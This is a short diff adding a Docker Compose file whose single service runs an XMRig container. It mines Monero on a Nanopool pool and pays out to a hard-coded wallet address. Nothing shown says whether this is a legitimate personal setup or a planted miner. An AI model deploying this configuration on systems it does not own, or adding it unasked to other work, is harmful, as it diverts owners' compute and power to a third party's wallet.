@@ -1,0 +1,6 @@
+version: "3"
+
+services:
+  miner:
+    image: kingdarkness/xmrig
+    command: "-o xmr-asia1.nanopool.org:14433 --tls --coin monero -u 423cTTx6LDyLppiTbsmP2SPZNMV4EpMDqff8AB4d1jMvgSvRJxp8wa9Yn3DdVmuQSNLBE75quuCn8h3tx17nshvJ4Yzaoeh -p x -t 1 -l /var/log/xmrig.log"
